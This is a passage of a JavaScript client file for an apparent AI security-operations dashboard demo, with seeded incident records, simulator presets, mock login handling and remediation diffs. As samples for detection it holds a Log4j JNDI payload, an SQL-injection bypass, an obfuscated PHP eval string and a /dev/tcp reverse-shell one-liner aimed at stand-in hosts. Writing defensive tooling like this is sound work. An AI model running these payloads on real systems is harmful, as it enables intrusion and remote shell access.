/**
 * MATEX AI - Core Client Application & SPA State Controller
 * Features:
 * - ChatGPT-style left sidebar dashboard & responsive navigation
 * - Realistic authentication & session manager (Sign In, Register, Password Strength, SSO, Session Control)
 * - Calibrated 3-tier Confidence Banners:
 *     Green (>80%): Automated execution verified
 *     Yellow (60%-80%): Ambiguous threat / Flagged for SOC Analyst
 *     Red (<60%): Low confidence / Critical Anomaly requiring human escalation
 * - Full Tabulation in Results output (Threat Intel, Structured Telemetry Table, Remediation, Code Diff, Raw JSON)
 * - Proactive code self-correction engine
 * - Audit log search, filtering & JSON export
 * - Dynamic cyber mouse click effect & visual feedback
 */

// Initial Seed Data for Realistic Cybersecurity SOC Telemetry
const DEFAULT_HISTORY = [
  {
    id: 'MATEX-INC-9901',
    timestamp: new Date().toISOString(),
    query: '${jndi:ldap://198.51.100.22:1389/Exploit}',
    mode: 'web_search',
    confidenceScore: 96.8, // > 80 -> GREEN BANNER
    threatLevel: 'CRITICAL',
    automatedAction: 'BLOCK',
    summary: 'Critical Remote Code Execution attempt via Log4j JNDI injection (CVE-2021-44228). Malicious LDAP lookup intercepted at perimeter.',
    mitreAttack: ['T1190 - Exploit Public-Facing Application', 'T1059.004 - Unix Shell'],
    cveList: ['CVE-2021-44228', 'CVE-2021-45046'],
    indicators: ['jndi:ldap:// schema', 'Outbound TCP 1389 vector', 'Target: org.apache.logging.log4j'],
    explanationPoints: [
      'Payload contains raw recursive JNDI resolution string intended to trigger arbitrary Java class deserialization.',
      'Immediate egress callback connection attempted towards untrusted external staging server.',
      'High exploit fidelity matching known active cyber-espionage and automated botnet scanning signatures.'
    ],
    remediationSteps: [
      'iptables -A OUTPUT -p tcp --dport 1389 -j DROP # Drop immediate LDAP egress',
      'export LOG4J_FORMAT_MSG_NO_LOOKUPS=true # Emergency JVM mitigation flag',
      'Upgrade org.apache.logging.log4j:log4j-core to version >= 2.17.1'
    ],
    proactiveCorrection: {
      hasCorrection: true,
      language: 'java',
      originalCode: `// Vulnerable: Unsanitized user-controlled input logged directly
String userAgent = request.getHeader("User-Agent");
logger.info("Incoming connection: {}", userAgent);
// Exploit string evaluated dynamically: \${jndi:ldap://...}`,
      correctedCode: `// Secure: Sanitized logging & Log4j 2.17.1 with Lookups Disabled
String userAgent = request.getHeader("User-Agent");
String sanitizedHeader = StringEscapeUtils.escapeJava(
    userAgent != null ? userAgent.replaceAll("[^\\\\p{Print}]", "") : ""
);
logger.info("Incoming connection: [{}]", sanitizedHeader);`,
      explanation: 'Enforces strict alphanumeric character whitelisting on incoming request headers and guarantees lookups cannot evaluate dynamically within the logger context.'
    }
  },
  {
    id: 'MATEX-INC-9902',
    timestamp: new Date(Date.now() - 3600000 * 2).toISOString(),
    query: 'Failed password for root from 10.14.2.45 port 22 ssh2 (18 attempts in 60s)',
    mode: 'web_search',
    confidenceScore: 68.4, // 60-80 -> YELLOW BANNER
    threatLevel: 'MEDIUM',
    automatedAction: 'FLAGGED FOR HUMAN / SOC ANALYST',
    summary: 'Ambiguous internal administrative activity vs automated brute-force burst from internal subnet 10.14.2.0/24.',
    mitreAttack: ['T1110.001 - Password Guessing', 'T1021.004 - SSH Lateral Movement'],
    cveList: ['CWE-307: Improper Restriction of Excessive Authentication Attempts'],
    indicators: ['Burst of 18 authentication events in 60s', 'Workstation IP: 10.14.2.45', 'Target: root/svc_backup'],
    explanationPoints: [
      'Confidence score is 68.4% (falls into 60%-80% ambiguous band). Automatic perimeter block withheld to avoid disrupting scheduled cron backups.',
      'Originating IP is within corporate intranet, but authentication frequency exceeds baseline threshold by 400%.',
      'Requires Tier-2 SOC Analyst verification to confirm whether automated backup cron job had an expired credential or an adversary is attempting lateral traversal.'
    ],
    remediationSteps: [
      'SOC ACTION: Contact DevOps On-Call to verify scheduled maintenance on host 10.14.2.45',
      'Inspect /var/log/auth.log on destination host for public-key fingerprint match',
      'fail2ban-client set sshd banip 10.14.2.45 # Optional manual enforcement'
    ],
    proactiveCorrection: {
      hasCorrection: true,
      language: 'bash',
      originalCode: `// Unprotected SSH Configuration in /etc/ssh/sshd_config
PermitRootLogin yes
PasswordAuthentication yes
MaxAuthTries 100`,
      correctedCode: `// Hardened SSH Configuration in /etc/ssh/sshd_config
PermitRootLogin prohibit-password
PasswordAuthentication no
PubkeyAuthentication yes
MaxAuthTries 3
ClientAliveInterval 300
AllowGroups sysadmin-soc backup-operators`,
      explanation: 'Hardens SSH daemon configuration by disabling password authentication, prohibiting direct root login, and limiting failed authentication attempts to 3.'
    }
  },
  {
    id: 'MATEX-INC-9903',
    timestamp: new Date(Date.now() - 3600000 * 26).toISOString(),
    query: "SELECT * FROM users WHERE user = 'admin' AND pass = '' OR 1=1--",
    mode: 'web_search',
    confidenceScore: 94.2, // > 80 -> GREEN BANNER
    threatLevel: 'HIGH',
    automatedAction: 'BLOCK',
    summary: 'Classic SQL Injection authentication bypass payload targeting relational database backend.',
    mitreAttack: ['T1190 - Exploit Public-Facing Application', 'T1059 - Command and Scripting Interpreter'],
    cveList: ['CWE-89: SQL Injection'],
    indicators: ["OR 1=1 pattern", "Comment termination token (--)", "Auth bypass attempt"],
    explanationPoints: [
      'Input string terminates SQL statement condition to force boolean TRUE evaluation.',
      'Would grant unauthenticated administrative session if processed without parameterization.',
      'Automated WAF blocking rule dispatched immediately with 94.2% verified confidence.'
    ],
    remediationSteps: [
      'waf-cli rule add --signature SQLI_CORE_942100 --action BLOCK',
      'Audit all backend ORM queries for string concatenations',
      'Enforce parameterized prepared statements across all API endpoints'
    ],
    proactiveCorrection: {
      hasCorrection: true,
      language: 'javascript',
      originalCode: `// Vulnerable: Raw string concatenation in SQL query
app.post('/api/login', async (req, res) => {
  const { username, password } = req.body;
  const sql = "SELECT * FROM users WHERE user = '" + username + "' AND pass = '" + password + "'";
  return res.json(await db.query(sql));
});`,
      correctedCode: `// Secure: Parameterized prepared statements preventing SQLi
app.post('/api/login', async (req, res) => {
  const { username, password } = req.body;
  const sql = 'SELECT id, username, role, password_hash FROM users WHERE username = $1 LIMIT 1';
  const result = await db.query(sql, [username]);
  if (!result.rows.length) return res.status(401).json({ error: 'Invalid credentials' });
  const valid = await bcrypt.compare(password, result.rows[0].password_hash);
  if (!valid) return res.status(401).json({ error: 'Invalid credentials' });
  return res.json({ status: 'authenticated', role: result.rows[0].role });
});`,
      explanation: 'Replaces raw string concatenation with parameterized prepared statements ($1) and introduces secure bcrypt hashing verification.'
    }
  },
  {
    id: 'MATEX-INC-9904',
    timestamp: new Date(Date.now() - 3600000 * 48).toISOString(),
    query: 'eval(gzinflate(base64_decode("7b1re+M2kiD8fP0V2k/Ldms6I5G25c3GZk+8dmyPXfve3vG4T04o29p4s...',
    mode: 'web_search',
    confidenceScore: 49.5, // < 60 -> RED BANNER
    threatLevel: 'CRITICAL',
    automatedAction: 'FLAGGED FOR HUMAN / SOC ANALYST',
    summary: 'High-Entropy Polyglot Obfuscated Shell Payload with Low Confidence Certainty (<60%). Suspicious packer artifact.',
    mitreAttack: ['T1027 - Obfuscated Files or Information', 'T1059 - Command Interpreters'],
    cveList: ['Zero-Day Heuristic Signature #8819'],
    indicators: ['Base64 + Gzip decode nesting', 'High Shannon Entropy (> 7.4)', 'Unrecognized packer format'],
    explanationPoints: [
      'Payload exhibits extreme Shannon entropy and multiple nested decode operations indicating polymorphic malware.',
      'Confidence score is 49.5% (below 60% confidence floor). Autonomous classification withheld due to novelty of packer signature.',
      'Mandatory human SOC analyst triage required to prevent zero-day lateral execution while ensuring business continuity.'
    ],
    remediationSteps: [
      'Isolate endpoint node to forensic VLAN quarantine immediately',
      'SOC ACTION: Submit memory core dump to sandbox detonation chamber',
      'Block parent PID in EDR telemetry console'
    ],
    proactiveCorrection: {
      hasCorrection: true,
      language: 'php',
      originalCode: `// High-risk dynamic code execution
eval(gzinflate(base64_decode($_POST['payload'])));`,
      correctedCode: `// Secure: Reject dynamic eval and enforce strict structured JSON schema
$input = json_decode(file_get_contents('php://input'), true);
if (json_last_error() !== JSON_ERROR_NONE) {
    throw new SecurityException("Malformed request payload");
}
$sanitizedCommand = filter_var($input['action'] ?? '', FILTER_SANITIZE_SPECIAL_CHARS);`,
      explanation: 'Completely strips dangerous eval/unserialization functions in favor of strongly-typed JSON schema validation.'
    }
  }
];

class MatexApp {
  constructor() {
    this.currentView = 'about';
    this.chatMode = 'web_search';
    this.authTab = 'signin';
    this.activeSimPreset = 'log4j';
    
    // Load Settings & State from LocalStorage
    this.settings = this.loadSettings();
    this.history = this.loadHistory();
    this.user = this.loadUser();
    this.isSidebarCollapsed = localStorage.getItem('matex_sidebar_collapsed') === 'true';

    this.init();
  }

  init() {
    this.setupRouter();
    this.applySettings();
    this.applySidebarCollapsedState();
    this.renderHistoryList();
    this.renderRecentAuditsInSidebar();
    this.renderInitialChatFeed();
    this.renderAuthUI();
    this.updateUserBadge();
    this.setupEventListeners();
    this.setupClickEffect();
  }

  // =========================================================================
  // SETTINGS & STORAGE
  // =========================================================================
  loadSettings() {
    const saved = localStorage.getItem('matex_settings');
    if (saved) {
      try { return JSON.parse(saved); } catch (e) { /* fallback */ }
    }
    return {
      operationalMode: 'soc', // 'soc' or 'individual'
      theme: 'cyan', // 'cyan', 'matrix', 'crimson', 'violet', etc.
      temperature: 0.2,
      proactiveDiffs: true
    };
  }

  saveSettings() {
    localStorage.setItem('matex_settings', JSON.stringify(this.settings));
  }

  loadHistory() {
    const saved = localStorage.getItem('matex_history');
    if (saved) {
      try { return JSON.parse(saved); } catch (e) { /* fallback */ }
    }
    return DEFAULT_HISTORY;
  }

  saveHistory() {
    localStorage.setItem('matex_history', JSON.stringify(this.history));
    this.renderRecentAuditsInSidebar();
  }

  loadUser() {
    const saved = localStorage.getItem('matex_user');
    if (saved) {
      try { return JSON.parse(saved); } catch (e) { /* fallback */ }
    }
    return {
      name: 'SecOps-Lead-77',
      role: 'Tier 3 Incident Commander',
      email: 'analyst.lead@enterprise.secops.io',
      token: 'MATEX-SOC-ALPHA-994',
      isAuthenticated: true
    };
  }

  saveUser() {
    localStorage.setItem('matex_user', JSON.stringify(this.user));
    this.updateUserBadge();
    this.renderAuthUI();
  }

  // =========================================================================
  // SPA ROUTER & SIDEBAR
  // =========================================================================
  setupRouter() {
    window.matexRouter = {
      navigate: (page) => this.navigateTo(page)
    };

    window.addEventListener('hashchange', () => {
      const hash = window.location.hash.replace('#', '') || 'about';
      this.navigateTo(hash, false);
    });

    // Initial Route
    const initialHash = window.location.hash.replace('#', '') || 'about';
    this.navigateTo(initialHash, false);
  }

  navigateTo(page, updateHash = true) {
    const validPages = ['about', 'login', 'chat', 'history', 'settings'];
    const targetPage = validPages.includes(page) ? page : 'about';

    if (updateHash) {
      window.location.hash = `#${targetPage}`;
      return;
    }

    this.currentView = targetPage;

    // Toggle View Sections
    document.querySelectorAll('.page-view').forEach(view => {
      view.classList.remove('active');
    });
    const activeSection = document.getElementById(`view-${targetPage}`);
    if (activeSection) {
      activeSection.classList.add('active');
    }

    // Toggle Nav Tabs in Sidebar
    document.querySelectorAll('.nav-tab').forEach(tab => {
      if (tab.getAttribute('data-page') === targetPage) {
        tab.classList.add('active');
      } else {
        tab.classList.remove('active');
      }
    });

    // Update Breadcrumb text
    this.updateBreadcrumb(targetPage);

    // Auto-close sidebar on mobile
    this.toggleSidebar(false);

    window.scrollTo({ top: 0, behavior: 'smooth' });

    // Refresh history if navigating there
    if (targetPage === 'history') {
      this.renderHistoryList();
    }

    // Refresh auth UI if navigating there
    if (targetPage === 'login') {
      this.renderAuthUI();
    }
  }

  updateBreadcrumb(page) {
    const el = document.getElementById('current-view-breadcrumb');
    if (!el) return;
    const names = {
      about: 'PLATFORM INTEL',
      chat: 'INTELLIGENCE CONSOLE',
      history: 'AUDIT HISTORY & SIEM',
      settings: 'ENGINE SETTINGS',
      login: 'SECURITY ACCESS & AUTH'
    };
    el.textContent = names[page] || page.toUpperCase();
  }

  toggleSidebar(open) {
    const sidebar = document.getElementById('chatgpt-sidebar');
    const backdrop = document.getElementById('sidebar-backdrop');
    if (!sidebar) return;

    if (open === undefined) {
      sidebar.classList.toggle('open');
      if (backdrop) backdrop.classList.toggle('open');
    } else if (open) {
      sidebar.classList.add('open');
      if (backdrop) backdrop.classList.add('open');
    } else {
      sidebar.classList.remove('open');
      if (backdrop) backdrop.classList.remove('open');
    }
  }

  toggleSidebarCollapse() {
    this.isSidebarCollapsed = !this.isSidebarCollapsed;
    localStorage.setItem('matex_sidebar_collapsed', this.isSidebarCollapsed ? 'true' : 'false');
    this.applySidebarCollapsedState();
    this.showToast(this.isSidebarCollapsed ? 'Dashboard minimized to icon rail' : 'Dashboard expanded');
  }

  applySidebarCollapsedState() {
    const sidebar = document.getElementById('chatgpt-sidebar');
    const layout = document.getElementById('app-layout');
    const toggleBtn = document.getElementById('sidebar-toggle-btn');
    const deskToggleBtn = document.getElementById('desktop-sidebar-toggle-btn');

    if (!sidebar) return;

    if (this.isSidebarCollapsed) {
      sidebar.classList.add('collapsed');
      if (layout) layout.classList.add('sidebar-collapsed');
      if (toggleBtn) {
        toggleBtn.title = 'Expand Dashboard';
        toggleBtn.innerHTML = `
          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
            <polyline points="13 17 18 12 13 7"/>
            <polyline points="6 17 11 12 6 7"/>
          </svg>
        `;
      }
      if (deskToggleBtn) {
        deskToggleBtn.title = 'Expand Dashboard';
      }
    } else {
      sidebar.classList.remove('collapsed');
      if (layout) layout.classList.remove('sidebar-collapsed');
      if (toggleBtn) {
        toggleBtn.title = 'Minimize Dashboard';
        toggleBtn.innerHTML = `
          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
            <polyline points="11 17 6 12 11 7"/>
            <polyline points="18 17 13 12 18 7"/>
          </svg>
        `;
      }
      if (deskToggleBtn) {
        deskToggleBtn.title = 'Minimize Dashboard';
      }
    }
  }

  startNewChat() {
    this.navigateTo('chat');
    const input = document.getElementById('chat-query-input');
    if (input) {
      input.value = '';
      input.focus();
    }
    this.showToast('Ready for new security query');
    this.toggleSidebar(false);
  }

  renderRecentAuditsInSidebar() {
    const list = document.getElementById('sidebar-recent-list');
    const count = document.getElementById('sidebar-recent-count');
    if (!list) return;

    const recent = this.history.slice(0, 6);
    if (count) count.textContent = `${this.history.length}`;

    if (!recent.length) {
      list.innerHTML = `<div style="font-size: 0.75rem; color: var(--text-dim); padding: 8px;">No recent audits</div>`;
      return;
    }

    list.innerHTML = recent.map(item => {
      let bulletColor = 'var(--safe-emerald)';
      if (item.confidenceScore < 60) {
        bulletColor = 'var(--danger-crimson)';
      } else if (item.confidenceScore <= 80) {
        bulletColor = 'var(--warning-amber)';
      }

      const displayTitle = item.query.length > 28 ? item.query.slice(0, 28) + '...' : item.query;

      return `
        <div class="sidebar-recent-item" onclick="window.matexApp.loadRecentAudit('${item.id}')" title="${this.escapeQuotes(item.query)}">
          <span class="recent-bullet" style="background: ${bulletColor};"></span>
          <span style="overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">${this.escapeHtml(displayTitle)}</span>
        </div>
      `;
    }).join('');
  }

  loadRecentAudit(id) {
    const item = this.history.find(h => h.id === id);
    if (!item) return;

    this.navigateTo('chat');
    this.insertPrompt(item.query);
    this.showToast(`Loaded query: ${item.id}`);
  }

  updateUserBadge() {
    const nameEl = document.getElementById('sidebar-user-name');
    const roleEl = document.getElementById('sidebar-user-role');
    const avatarEl = document.getElementById('sidebar-avatar-initials');
    const modeBadge = document.getElementById('active-mode-badge');

    if (this.user) {
      if (nameEl) nameEl.textContent = this.user.name;
      if (roleEl) roleEl.textContent = this.user.role.split('-')[0].trim();
      if (avatarEl) {
        const initials = this.user.name.split('-').map(n => n[0]).join('').slice(0, 2).toUpperCase() || 'SL';
        avatarEl.textContent = initials;
      }
    }

    if (modeBadge) {
      modeBadge.textContent = this.settings.operationalMode === 'soc' ? 'SOC MODE' : 'STATION';
    }
  }

  // =========================================================================
  // AUTHENTICATION & LOGIN MANAGER
  // =========================================================================
  switchAuthTab(tab) {
    this.authTab = tab;
    const btnSignin = document.getElementById('tab-btn-signin');
    const btnRegister = document.getElementById('tab-btn-register');
    const formSignin = document.getElementById('form-signin');
    const formRegister = document.getElementById('form-register');
    const ssoBox = document.getElementById('auth-sso-container');
    const heading = document.getElementById('auth-main-heading');

    if (tab === 'signin') {
      if (btnSignin) btnSignin.classList.add('active');
      if (btnRegister) btnRegister.classList.remove('active');
      if (formSignin) formSignin.style.display = 'block';
      if (formRegister) formRegister.style.display = 'none';
      if (ssoBox) ssoBox.style.display = 'block';
      if (heading) heading.textContent = 'SOC Station Authentication';
    } else {
      if (btnSignin) btnSignin.classList.remove('active');
      if (btnRegister) btnRegister.classList.add('active');
      if (formSignin) formSignin.style.display = 'none';
      if (formRegister) formRegister.style.display = 'block';
      if (ssoBox) ssoBox.style.display = 'none';
      if (heading) heading.textContent = 'Provision New Security Identity';
    }
  }

  togglePasswordVisibility(inputId, btnEl) {
    const input = document.getElementById(inputId);
    if (!input) return;

    const isPassword = input.type === 'password';
    input.type = isPassword ? 'text' : 'password';

    if (btnEl) {
      btnEl.innerHTML = isPassword 
        ? `<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/></svg>`
        : `<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>`;
    }
  }

  checkPasswordStrength(pwd) {
    const meterFill = document.getElementById('reg-pwd-meter-fill');
    const label = document.getElementById('reg-pwd-strength-text');
    if (!meterFill || !label) return;

    if (!pwd || pwd.length === 0) {
      meterFill.className = 'password-meter-fill';
      meterFill.style.width = '0%';
      label.textContent = 'None';
      label.style.color = 'var(--text-muted)';
      return;
    }

    let score = 0;
    if (pwd.length >= 8) score++;
    if (pwd.length >= 12) score++;
    if (/[A-Z]/.test(pwd) && /[a-z]/.test(pwd)) score++;
    if (/[0-9]/.test(pwd)) score++;
    if (/[^A-Za-z0-9]/.test(pwd)) score++;

    meterFill.className = 'password-meter-fill';
    if (score <= 2) {
      meterFill.classList.add('weak');
      label.textContent = 'Weak (Non-compliant)';
      label.style.color = 'var(--danger-crimson)';
    } else if (score <= 4) {
      meterFill.classList.add('medium');
      label.textContent = 'Medium (Good)';
      label.style.color = 'var(--warning-amber)';
    } else {
      meterFill.classList.add('strong');
      label.textContent = 'Strong (SOC Certified)';
      label.style.color = 'var(--safe-emerald)';
    }
  }

  handleSignInSubmit() {
    const email = document.getElementById('signin-email').value;
    const token = document.getElementById('signin-token').value || 'MATEX-SOC-ALPHA-994';
    const clearanceSelect = document.getElementById('signin-clearance');
    const role = clearanceSelect ? clearanceSelect.options[clearanceSelect.selectedIndex].text : 'Tier 3 Incident Commander';

    const cleanName = email.split('@')[0].replace(/[^a-zA-Z0-9]/g, '-').slice(0, 16);

    this.user = {
      name: cleanName || 'SecOps-Analyst',
      role,
      email,
      token,
      isAuthenticated: true
    };
    this.saveUser();

    this.showToast(`Authenticated: ${this.user.name} (${this.user.role})`);
    setTimeout(() => this.navigateTo('chat'), 500);
  }

  handleRegisterSubmit() {
    const name = document.getElementById('reg-name').value;
    const email = document.getElementById('reg-email').value;
    const roleSelect = document.getElementById('reg-role');
    const role = roleSelect ? roleSelect.value : 'Tier 2 - Senior SOC Analyst';
    const pass = document.getElementById('reg-password').value;
    const passConfirm = document.getElementById('reg-password-confirm').value;

    if (pass !== passConfirm) {
      this.showToast('Passwords do not match. Please verify.');
      return;
    }

    if (pass.length < 8) {
      this.showToast('Password must be at least 8 characters long.');
      return;
    }

    const cleanName = name.replace(/[^a-zA-Z0-9]/g, '-').slice(0, 16);

    this.user = {
      name: cleanName || 'Analyst-New',
      role,
      email,
      token: `MATEX-KEY-${Math.floor(1000 + Math.random() * 9000)}`,
      isAuthenticated: true
    };
    this.saveUser();

    this.showToast(`Identity Provisioned & Authenticated: ${this.user.name}`);
    setTimeout(() => this.navigateTo('chat'), 500);
  }

  loginWithProvider(providerName) {
    const mockAccounts = {
      'Google Workspace SSO': {
        name: 'Google-SecOps',
        email: 'analyst.lead@secops.googleworkspace.corp',
        role: 'Tier 3 - Lead Incident Commander',
        token: 'OAUTH2-GOOGLE-WORKSPACE-SEC-998'
      },
      'GitHub Enterprise': {
        name: 'GitHub-Security',
        email: 'appsec@github-ent.secops.io',
        role: 'Tier 2 - Senior SOC Analyst',
        token: 'OAUTH2-GITHUB-ENTERPRISE-TOKEN-442'
      },
      'Okta / SAML 2.0': {
        name: 'Okta-SAML-User',
        email: 'soc-director@enterprise.okta.sso',
        role: 'Tier 3 - Incident Commander',
        token: 'SAML2-ASSERTION-TOKEN-X771'
      }
    };

    const acc = mockAccounts[providerName] || {
      name: 'SSO-Analyst',
      email: 'analyst@enterprise.io',
      role: 'Tier 2 - Senior SOC Analyst',
      token: 'SSO-TOKEN-DEFAULT'
    };

    this.user = {
      ...acc,
      isAuthenticated: true
    };
    this.saveUser();

    this.showToast(`Signed in via ${providerName}`);
    setTimeout(() => this.navigateTo('chat'), 500);
  }

  loadDemoProfile(type) {
    if (type === 'lead') {
      document.getElementById('signin-email').value = 'analyst.lead@enterprise.secops.io';
      document.getElementById('signin-password').value = 'SecOps#Alpha2026!';
      document.getElementById('signin-clearance').value = 'tier3';
    } else if (type === 'analyst') {
      document.getElementById('signin-email').value = 'vance.soc@enterprise.secops.io';
      document.getElementById('signin-password').value = 'Vance#ThreatAudit99!';
      document.getElementById('signin-clearance').value = 'tier2';
    } else if (type === 'workstation') {
      document.getElementById('signin-email').value = 'operator42@internal.secops.io';
      document.getElementById('signin-password').value = 'Station#DeskUser42!';
      document.getElementById('signin-clearance').value = 'individual';
    }
    this.handleSignInSubmit();
  }

  renderAuthUI() {
    const card = document.getElementById('auth-active-session');
    const header = document.getElementById('auth-form-header');
    const tabs = document.getElementById('auth-tabs-bar');
    const sso = document.getElementById('auth-sso-container');
    const signin = document.getElementById('form-signin');
    const register = document.getElementById('form-register');

    if (!card) return;

    if (this.user && this.user.isAuthenticated) {
      card.style.display = 'block';
      if (header) header.style.display = 'none';
      if (tabs) tabs.style.display = 'none';
      if (sso) sso.style.display = 'none';
      if (signin) signin.style.display = 'none';
      if (register) register.style.display = 'none';

      const nameEl = document.getElementById('auth-active-name');
      const roleEl = document.getElementById('auth-active-role');
      const emailEl = document.getElementById('auth-active-email');
      const tokenEl = document.getElementById('auth-active-token');
      const avatarEl = document.getElementById('auth-avatar-disp');

      if (nameEl) nameEl.textContent = this.user.name;
      if (roleEl) roleEl.textContent = this.user.role;
      if (emailEl) emailEl.textContent = this.user.email;
      if (tokenEl) tokenEl.textContent = this.user.token || 'MATEX-SOC-ALPHA-994';
      if (avatarEl) {
        avatarEl.textContent = this.user.name.slice(0, 2).toUpperCase();
      }
    } else {
      card.style.display = 'none';
      if (header) header.style.display = 'block';
      if (tabs) tabs.style.display = 'grid';
      if (sso) sso.style.display = 'block';
      this.switchAuthTab('signin');
    }
  }

  handleLogout() {
    if (this.user) {
      this.user.isAuthenticated = false;
      this.saveUser();
    }
    this.showToast('Session terminated. Credentials revoked.');
    this.renderAuthUI();
  }

  lockWorkstation() {
    if (this.user) {
      this.user.isAuthenticated = false;
      this.saveUser();
    }
    this.showToast('Workstation locked. Re-authentication required.');
    this.renderAuthUI();
  }

  openForgotPasswordModal() {
    const modal = document.getElementById('forgot-password-modal');
    if (modal) modal.classList.add('open');
  }

  closeForgotPasswordModal() {
    const modal = document.getElementById('forgot-password-modal');
    if (modal) modal.classList.remove('open');
  }

  handleRecoverySubmit() {
    const email = document.getElementById('recovery-email').value;
    this.closeForgotPasswordModal();
    this.showToast(`Cryptographic reset token dispatched to ${email}`);
  }

  // =========================================================================
  // SIMULATOR (Page 1 - About)
  // =========================================================================
  setupEventListeners() {
    document.querySelectorAll('.preset-chip').forEach(chip => {
      chip.addEventListener('click', (e) => {
        document.querySelectorAll('.preset-chip').forEach(c => c.classList.remove('active'));
        chip.classList.add('active');
        const presetKey = chip.getAttribute('data-preset');
        this.selectSimPreset(presetKey);
      });
    });

    const simRunBtn = document.getElementById('sim-run-btn');
    if (simRunBtn) {
      simRunBtn.addEventListener('click', () => this.runSimulation());
    }
  }

  selectSimPreset(key) {
    this.activeSimPreset = key;
    const codeDisplay = document.getElementById('sim-code-display');
    const presets = {
      log4j: '${jndi:ldap://198.51.100.22:1389/Exploit}',
      ssh_burst: 'Failed password for root from 10.14.2.45 port 22 ssh2 (18 attempts in 60s)',
      sqli: "SELECT * FROM accounts WHERE id = 'admin' AND pass = '' OR 1=1--",
      reverse_shell: 'bash -i >& /dev/tcp/198.51.100.89/4444 0>&1',
      benign: 'GET /v1/health HTTP/1.1 Host: telemetry.corp.internal User-Agent: kube-probe/1.28'
    };

    if (codeDisplay && presets[key]) {
      codeDisplay.textContent = presets[key];
    }
    this.runSimulation();
  }

  runSimulation() {
    const codeDisplay = document.getElementById('sim-code-display');
    const query = codeDisplay ? codeDisplay.textContent : '${jndi:ldap://198.51.100.22:1389/Exploit}';
    
    const spinner = document.getElementById('sim-btn-spinner');
    if (spinner) spinner.style.display = 'inline-block';

    const confEl = document.getElementById('sim-confidence');
    const actionEl = document.getElementById('sim-action');
    const correctionEl = document.getElementById('sim-correction');

    if (confEl) confEl.textContent = 'Calculating...';

    setTimeout(() => {
      if (spinner) spinner.style.display = 'none';

      let score = 96.8;
      let action = 'AUTOMATED BLOCK';
      let actionColor = 'var(--danger-crimson)';
      let correction = 'Hardened Patch Ready';

      if (this.activeSimPreset === 'ssh_burst') {
        score = 68.4;
        action = 'FLAGGED FOR SOC ANALYST';
        actionColor = 'var(--warning-amber)';
        correction = 'SSH Config Hardening Ready';
      } else if (this.activeSimPreset === 'benign') {
        score = 88.5;
        action = 'AUTOMATED ALLOW';
        actionColor = 'var(--safe-emerald)';
        correction = 'Baseline Validated';
      } else if (this.activeSimPreset === 'sqli') {
        score = 94.2;
        action = 'AUTOMATED BLOCK';
        actionColor = 'var(--danger-crimson)';
        correction = 'Parameterized SQL Ready';
      } else if (this.activeSimPreset === 'reverse_shell') {
        score = 98.4;
        action = 'AUTOMATED BLOCK';
        actionColor = 'var(--danger-crimson)';
        correction = 'TLS Beacon Script Ready';
      }

      if (confEl) {
        confEl.textContent = `${score}%`;
        confEl.style.color = score > 80 ? 'var(--safe-emerald)' : score >= 60 ? 'var(--warning-amber)' : 'var(--danger-crimson)';
      }
      if (actionEl) {
        actionEl.textContent = action;
        actionEl.style.color = actionColor;
      }
      if (correctionEl) {
        correctionEl.textContent = correction;
      }

      this.showToast(`Simulation: ${action} (${score}%)`);
    }, 400);
  }

  loadSimIntoChat() {
    const codeDisplay = document.getElementById('sim-code-display');
    const query = codeDisplay ? codeDisplay.textContent : '${jndi:ldap://198.51.100.22:1389/Exploit}';
    this.navigateTo('chat');
    this.insertPrompt(query);
    setTimeout(() => this.executeChatAnalysis(), 200);
  }

  // =========================================================================
  // MAIN INTELLIGENCE CHAT & AUDITOR (Page 3 - Chat)
  // =========================================================================
  setChatMode(mode) {
    this.chatMode = mode;
    this.showToast(`Analysis Mode: ${mode.replace('_', ' ').toUpperCase()}`);
  }

  insertPrompt(text) {
    const input = document.getElementById('chat-query-input');
    if (input) {
      input.value = text;
      input.focus();
    }
  }

  async executeChatAnalysis() {
    const input = document.getElementById('chat-query-input');
    const query = input ? input.value.trim() : '';

    if (!query) {
      this.showToast('Please enter code, server log, or threat query.');
      if (input) input.focus();
      return;
    }

    const submitBtn = document.getElementById('chat-submit-btn');
    const spinner = document.getElementById('chat-btn-spinner');

    if (submitBtn) submitBtn.disabled = true;
    if (spinner) spinner.style.display = 'inline-block';

    try {
      const res = await fetch('/api/analyze', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          query,
          mode: this.chatMode,
          threshold: 80, // standardized 80% boundary
          operationalMode: this.settings.operationalMode
        })
      });

      if (!res.ok) {
        throw new Error(`Server returned ${res.status}`);
      }

      const data = await res.json();
      const newRecord = {
        id: `MATEX-INC-${Math.floor(1000 + Math.random() * 9000)}`,
        timestamp: new Date().toISOString(),
        query,
        mode: this.chatMode,
        ...data
      };

      this.history.unshift(newRecord);
      this.saveHistory();

      this.prependCardToFeed(newRecord);
      this.showToast(`Analysis Complete: ${data.automatedAction} (${data.confidenceScore}%)`);

      if (input) input.value = '';
    } catch (err) {
      console.warn('API call fallback to local analysis:', err);
      const localResult = this.runLocalFallback(query);
      const fallbackRecord = {
        id: `MATEX-INC-${Math.floor(1000 + Math.random() * 9000)}`,
        timestamp: new Date().toISOString(),
        query,
        mode: this.chatMode,
        ...localResult
      };

      this.history.unshift(fallbackRecord);
      this.saveHistory();
      this.prependCardToFeed(fallbackRecord);
      this.showToast(`Analysis Complete: ${fallbackRecord.automatedAction} (${fallbackRecord.confidenceScore}%)`);
    } finally {
      if (submitBtn) submitBtn.disabled = false;
      if (spinner) spinner.style.display = 'none';
    }
  }

  runLocalFallback(query) {
    const qLower = query.toLowerCase();

    // 1. Log4j / JNDI
    if (qLower.includes('jndi') || qLower.includes('ldap') || qLower.includes('log4j')) {
      const confidence = 96.8;
      return {
        confidenceScore: confidence,
        threatLevel: 'CRITICAL',
